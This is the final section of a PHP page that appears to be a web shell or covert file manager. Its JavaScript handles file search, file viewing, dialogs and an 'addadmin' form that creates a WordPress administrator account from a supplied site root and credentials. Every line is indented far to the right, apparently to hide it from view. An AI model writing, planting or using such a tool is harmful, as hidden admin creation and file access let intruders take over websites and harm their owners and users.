                                                                                                                                                                  if(!user||!mail||!pass){msg.className='fmsg er';msg.textContent='All fields required.';return;}
                                                                                                                                                                  if(pass!==pass2){msg.className='fmsg er';msg.textContent='Passwords do not match.';return;}
                                                                                                                                                                  if(pass.length<8){msg.className='fmsg er';msg.textContent='Password must be ≥8 characters.';return;}
                                                                                                                                                                  msg.className='fmsg';msg.textContent='Creating…';
                                                                                                                                                                  const d=await api({action:'addadmin',wproot:root,username:user,email:mail,password:pass});
                                                                                                                                                                  msg.className='fmsg '+(d.success?'ok':'er');msg.textContent=d.success||d.error;
                                                                                                                                                              }

                                                                                                                                                              // ── SEARCH ──
                                                                                                                                                              async function doSearch(){
                                                                                                                                                                  const q=vi('sq').trim(),mode=document.getElementById('sm').value;if(!q){st('Enter search term',1);return;}
                                                                                                                                                                  const res=document.getElementById('sres');res.innerHTML='<div style="color:var(--muted);font-size:12px">Searching…</div>';
                                                                                                                                                                  const d=await api({action:'search',path:cwd,query:q,mode});
                                                                                                                                                                  if(d.error){res.innerHTML=`<div style="color:var(--red)">${ex(d.error)}</div>`;return;}
                                                                                                                                                                  if(!d.results.length){res.innerHTML='<div style="color:var(--muted);font-size:12px;padding:8px 0">No results.</div>';return;}
                                                                                                                                                                  res.innerHTML=`<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${d.count} result(s)</div>`+
                                                                                                                                                                  d.results.map(r=>`<div class="sr" onclick="openSR('${ex(r.path)}','${r.type}')">
                                                                                                                                                                  <span>${r.type==='dir'?'📁':'📄'}</span><span>${ex(r.name)}</span>
                                                                                                                                                                  <span class="srp">${ex(r.path)}</span><span class="srsz">${r.size}</span></div>`).join('');
                                                                                                                                                              }
                                                                                                                                                              function openSR(path,type){
                                                                                                                                                                  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
                                                                                                                                                                  document.querySelectorAll('.tbtn').forEach(b=>b.classList.remove('on'));
                                                                                                                                                                  document.getElementById('p-files').classList.add('on');
                                                                                                                                                                  document.querySelectorAll('.tbtn')[0].classList.add('on');
                                                                                                                                                                  const dir=type==='dir'?path:path.substring(0,path.lastIndexOf('/'))||'/';
                                                                                                                                                                  go(dir).then(()=>{if(type!=='dir')setTimeout(()=>openFile({path,name:path.split('/').pop(),type:'file',readable:true,writable:false}),500);});
                                                                                                                                                              }

                                                                                                                                                              // ── MODAL ──
                                                                                                                                                              function showM(title,body,cb,okRed,infoOnly){
                                                                                                                                                                  document.getElementById('mt').textContent=title;
                                                                                                                                                                  document.getElementById('mb').innerHTML=body;mCb=cb;
                                                                                                                                                                  const ok=document.getElementById('mok');
                                                                                                                                                                  ok.className='bco'+(okRed?' red':'');
                                                                                                                                                                  ok.classList.toggle('hide',!!infoOnly);
                                                                                                                                                                  document.getElementById('mbg').classList.add('show');
                                                                                                                                                                  setTimeout(()=>{const i=document.querySelector('#mb input,#mb select');if(i)i.focus();},50);
                                                                                                                                                              }
                                                                                                                                                              document.getElementById('mok').addEventListener('click',async()=>{if(mCb)await mCb();closeM();});
                                                                                                                                                              function closeM(){document.getElementById('mbg').classList.remove('show');mCb=null;}
                                                                                                                                                              document.addEventListener('keydown',e=>{if(e.key==='Escape')closeM();});

                                                                                                                                                              // ── UTILS ──
                                                                                                                                                              function st(m,e){const s=document.getElementById('stmsg');s.textContent=m;s.className=e?'err':'ok';}
                                                                                                                                                              function vi(id){return document.getElementById(id)?.value||'';}
                                                                                                                                                              function ex(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
                                                                                                                                                              function exH(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}

                                                                                                                                                              // INIT — start at current directory
                                                                                                                                                              go(cwd);
                                                                                                                                                              </script>
                                                                                                                                                              <?php endif; ?>
                                                                                                                                                              </body>
                                                                                                                                                              </html>
